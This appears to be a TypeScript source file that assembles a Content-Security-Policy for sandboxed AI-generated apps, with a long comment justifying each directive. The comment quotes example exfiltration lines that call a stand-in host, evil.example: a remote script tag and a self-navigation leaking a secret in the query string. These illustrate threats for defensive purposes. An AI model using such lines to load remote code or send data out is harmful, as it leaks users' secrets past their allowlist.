/**
 * The Content-Security-Policy app HTML is served under.
 *
 * An app is AI-generated code we did not review, so the policy's job is not to stop
 * it running arbitrary JS — that is the product — but to stop it *reaching hosts the
 * user never approved*. Every external call is supposed to travel through the fetch
 * proxy, where the domain allowlist applies.
 *
 * `connect-src` alone does not deliver that, which is what this policy used to be.
 * It governs fetch/XHR/WebSocket/EventSource/sendBeacon/`<a ping>` and nothing else,
 * so a single `<script src="https://evil.example/x.js">` walked straight around the
 * allowlist, and an `<img>` or a cross-origin form POST carried data back out. The
 * directives below close each of those channels by naming the host set explicitly.
 *
 * ## connect-src
 *
 * `'self'` is the origin the document came from; every external call has to go
 * through the proxy.
 *
 * `blob:` and `data:` are named because `'self'` does not cover them — CSP matches
 * those schemes only when they are listed literally, so `fetch(blobUrl)` was refused
 * inside every app. That broke window capture on any app that renders proxied images
 * from object URLs (the DC gallery fetches through `yaar://http` to get a Referer,
 * then paints from `URL.createObjectURL`): the capture script inlines each `<img>` by
 * fetching its `src`, the fetch was blocked, and every image landed in the screenshot
 * as a transparent placeholder — so OCR read a page with holes where the art was.
 *
 * Neither scheme is network reach. A `blob:` URL is only fetchable by the origin that
 * created it, and a `data:` URL is bytes the document already holds; both are content
 * the app can read anyway (`FileReader` over the source `Blob`, `atob` over the
 * base64). What the directive confines — which *hosts* an app may talk to — is
 * untouched.
 *
 * ## script-src
 *
 * `'unsafe-inline'` and `'unsafe-eval'` look alarming and cost nothing here. They
 * relax *how* an app runs its own code; an app already runs arbitrary code by design,
 * so there is no privilege on the other side of that door. What the directive is for
 * is the host list, and `'self'` is what makes remote code un-loadable.
 *
 * Both are load-bearing, not conservatism:
 * - `'unsafe-inline'` — `generateHtmlWrapper` emits the SDK, the manifest, the link
 *   config, and the app itself as four inline `<script>` tags. A nonce would have to
 *   be stamped per request into a file that is otherwise served straight off disk with
 *   a long cache, and a hash changes on every build.
 * - `'unsafe-eval'` — the `yaar-ml` shim reaches ORT through `new Function('u',
 *   'return import(u)')`, deliberately, so Bun cannot resolve the specifier at build
 *   time. It also covers `WebAssembly.instantiate`, which would otherwise need
 *   `'wasm-unsafe-eval'` named separately.
 *
 * `blob:` because that is the only shape of dynamically-constructed script a
 * single-file app can produce.
 *
 * ## worker-src
 *
 * `'self'` for onnxruntime's `ort-wasm-proxy-worker`, which it spawns from its own
 * script URL under `/api/ml-runtime/`. `blob:` because a bundled library that ships a
 * worker has no sibling file to point at in a single-file app, so a blob URL is its
 * only option. Without this directive workers would fall through to `child-src` and
 * then `default-src`, which is unset — open today, and silently open to any host the
 * moment someone adds a `default-src`.
 *
 * ## object-src / base-uri / form-action
 *
 * Three channels with no legitimate use in an app, all confirmed unused across
 * `apps/`: no `<object>`/`<embed>`, no `<base>` (the compiled wrapper emits none), and
 * no form that submits rather than calling `preventDefault`. `form-action 'none'`
 * blocks the cross-origin POST-with-a-body exfil path; a same-origin form that really
 * did submit would navigate the app's own frame away, which is a bug either way.
 *
 * ## What this cannot cover
 *
 * A frame navigating *itself* — `location.href = 'https://evil.example/?d=' + secret`.
 * The `navigate-to` directive was dropped from the spec, and the sandbox only governs
 * *top*-level navigation (see `IframeRenderer.navigated-away.test.tsx`). No CSP
 * closes it.
 *
 * ## The origin boundary
 *
 * Under app-origin isolation the host directives above are too tight. The app document
 * is served from the *app* origin while its baked-in SDKs address the *desktop* origin
 * handed to them as `__yaar_api` — so `'self'` blocks the app from reaching its own
 * backend, `/api/fetch` included. Naming both sides of the boundary keeps the policy
 * correct whichever one the document came from.
 *
 * Widening to the other side of the boundary grants no new reach: it is the same
 * server, and every route behind either origin still runs the iframe-token and
 * permission checks in `http/access.ts`. So both origins are appended to every
 * host-list directive, not just `connect-src` — a script or worker served from our own
 * other port is reachable by `fetch` + `eval` regardless, and a directive that
 * disagreed with `connect-src` would only produce a confusing break.
 */

import { APP_ORIGIN_HOST, DESKTOP_ORIGIN_HOST, getPort } from '../config.js';
import { getOriginBoundary } from './origin-boundary.js';

/** Directives carrying a host list — each gets the boundary origins appended. */
const HOST_DIRECTIVES = [
  "connect-src 'self' blob: data:",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
  "worker-src 'self' blob:",
];

/** Directives that name no host at all. */
const SEALED = ["object-src 'none'", "base-uri 'none'", "form-action 'none'"];

/**
 * The port the browser addressed, taken from `Host` so a proxied dev server (vite
 * on 5173 in front of the API) names the port the document actually came from.
 * That header is client-controlled, so it is honored only when it names a loopback
 * host with a numeric port — anything else falls back to the configured port. The
 * widening therefore can never leave loopback, where both origins already live.
 */
function servingPort(req: Request): number {
  const match = req.headers.get('host')?.match(/^([a-zA-Z0-9.-]+):(\d{1,5})$/);
  if (match && (match[1] === DESKTOP_ORIGIN_HOST || match[1] === APP_ORIGIN_HOST)) {
    return Number(match[2]);
  }
  return getPort();
}

/** Assemble the policy, appending `origins` to every host-list directive. */
function policy(origins: string[]): string {
  const extra = origins.length > 0 ? ' ' + origins.join(' ') : '';
  return [...HOST_DIRECTIVES.map((d) => d + extra), ...SEALED].join('; ');
}

export function appHtmlCsp(req: Request): string {
  const boundary = getOriginBoundary();
  switch (boundary.mode) {
    case 'off':
      return policy([]);
    case 'loopback-alias': {
      const port = servingPort(req);
      return policy([`http://${DESKTOP_ORIGIN_HOST}:${port}`, `http://${APP_ORIGIN_HOST}:${port}`]);
    }
    case 'proxy-port':
      // Both origins are published addresses the server itself chose — no Host to
      // second-guess, and no dev proxy in front of a tunnel.
      return policy([boundary.desktopOrigin, boundary.appOrigin]);
  }
}
